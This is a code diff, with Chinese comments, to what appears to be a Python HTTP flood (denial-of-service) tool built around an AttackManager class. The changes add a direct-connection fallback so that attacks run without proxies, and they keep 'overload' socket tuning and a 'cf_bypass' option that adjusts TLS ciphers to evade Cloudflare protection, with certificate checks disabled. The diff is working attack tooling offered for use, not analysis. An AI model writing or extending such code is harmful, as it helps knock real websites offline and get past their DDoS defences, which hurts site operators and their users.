@@ -269,6 +269,10 @@ class ConnectionPool:
         
     def get_connection(self, target: str, port: int, protocol: str):
         """从连接池获取连接"""
+        # 如果是直连模式，直接创建连接
+        if self.config.proxy_type == "direct":
+            return self._create_direct_connection(target, port, protocol)
+            
         proxy = self.proxy_manager.get_random_proxy()
         if not proxy:
             return None, None
@@ -309,6 +313,43 @@ class ConnectionPool:
                 except:
                     pass
     
+    def _create_direct_connection(self, target: str, port: int, protocol: str):
+        """创建直连连接"""
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            
+            # 设置超时
+            s.settimeout(self.config.connection_timeout)
+            
+            # 连接优化
+            if self.config.overload_mode:
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            
+            s.connect((target, port))
+            
+            if protocol == "https":
+                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                
+                if self.config.overload_mode:
+                    ctx.set_ciphers('ECDHE-RSA-AES128-GCM-SHA256')
+                    ctx.options |= ssl.OP_NO_COMPRESSION
+                elif self.config.cf_bypass:
+                    ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
+                    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+                    
+                s = ctx.wrap_socket(s, server_hostname=target)
+            
+            self.active_connections += 1
+            return s, "direct"
+            
+        except Exception as e:
+            self.logger.debug(f"直连创建失败: {e}")
+            return None, None
+
     def _create_connection(self, target: str, port: int, protocol: str, proxy: Tuple, proxy_str: str):
         """创建新连接"""
         try:
@@ -454,14 +495,22 @@ class ProxyManager:
             # 去重
             self.proxies = list(set(self.proxies))
             self.proxy_stats = {proxy: 0 for proxy in self.proxies}
-            print(f"成功加载了 {len(self.proxies)} 个代理")
+            
+            if len(self.proxies) > 0:
+                print(f"成功加载了 {len(self.proxies)} 个代理")
+            else:
+                print("代理文件为空，将使用直连模式")
+                # 添加直连模式统计
+                self.proxy_stats["direct"] = 0
+                
         except FileNotFoundError:
-            print(f"错误: 代理文件 {self.config.proxy_file} 不存在")
-            print("请创建代理文件或使用 --proxy-file 指定文件路径")
-            sys.exit(1)
+            print(f"警告: 代理文件 {self.config.proxy_file} 不存在，将使用直连模式")
+            self.proxies = []
+            self.proxy_stats = {"direct": 0}
         except Exception as e:
-            print(f"错误: 加载代理失败: {e}")
-            sys.exit(1)
+            print(f"警告: 加载代理失败: {e}，将使用直连模式")
+            self.proxies = []
+            self.proxy_stats = {"direct": 0}
     
     def get_random_proxy(self) -> Optional[Tuple[str, int]]:
         """获取随机代理"""
@@ -558,6 +607,43 @@ class AttackManager:
     @contextmanager
     def create_socket_connection(self, target: str, port: int, protocol: str):
         """创建Socket连接的上下文管理器"""
+        # 如果是直连模式
+        if self.config.proxy_type == "direct":
+            s = None
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(self.config.connection_timeout)
+                
+                # CF绕过优化：设置TCP选项
+                if self.config.cf_bypass:
+                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+                    
+                s.connect((target, port))
+                
+                if protocol == "https":
+                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                    
+                    # CF绕过：模拟现代TLS配置
+                    if self.config.cf_bypass:
+                        ctx.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
+                        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
+                        
+                    s = ctx.wrap_socket(s, server_hostname=target)
+                
+                yield s, "direct"
+                
+            finally:
+                if s:
+                    try:
+                        s.close()
+                    except:
+                        pass
+            return
+        
+        # 代理模式
         proxy = self.proxy_manager.get_random_proxy()
         if not proxy:
             raise Exception("没有可用代理")
@@ -677,7 +763,11 @@ class AttackManager:
                         
                         success = self._send_request(s, mode, target, path, cookies)
                         if success:
-                            self.proxy_manager.update_proxy_stats(proxy_str, 1)
+                            if proxy_str != "direct":
+                                self.proxy_manager.update_proxy_stats(proxy_str, 1)
+                            else:
+                                # 直连模式统计
+                                self.proxy_manager.update_proxy_stats("direct", 1)
                         else:
                             break
                             
@@ -874,8 +964,9 @@ class AttackManager:
         # 加载并检查代理
         self.proxy_manager.load_proxies()
         if len(self.proxy_manager.proxies) == 0:
-            self.logger.error("没有可用代理")
-            return
+            self.logger.warning("没有可用代理，将使用直连模式")
+            # 设置直连模式
+            self.config.proxy_type = "direct"
         
         self.running = True
         
